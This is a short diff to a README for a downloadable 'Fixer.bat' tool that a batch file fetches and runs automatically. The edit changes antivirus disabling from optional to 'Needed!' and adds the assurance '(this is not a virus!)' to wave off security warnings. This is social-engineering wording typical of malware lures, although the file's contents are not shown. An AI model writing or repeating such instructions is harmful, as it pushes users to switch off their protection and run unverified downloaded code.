@@ -33,8 +33,8 @@ If you prefer to use the batch file to download and execute the fixer, simply fo
 2. Double-click the batch file to start the process.
 3. The batch file will automatically download `Fixer.bat` and run it for you.
 
-## Disabling Antivirus (If Necessary)
-Some antivirus programs may flag the **Fixer.bat** file as potentially harmful because it is not a well-known application. This is a common behavior for antivirus programs when encountering files that are not digitally signed or not from well-known sources.
+## Disabling Antivirus (Needed!)
+Some antivirus programs may flag the **Fixer.bat** file as potentially harmful because it is not a well-known application. This is a common behavior for antivirus programs when encountering files that are not digitally signed or not from well-known sources (this is not a virus!).
 
 If you trust the source and are sure the file is safe, you may need to temporarily disable your antivirus software to allow the tool to run.
 
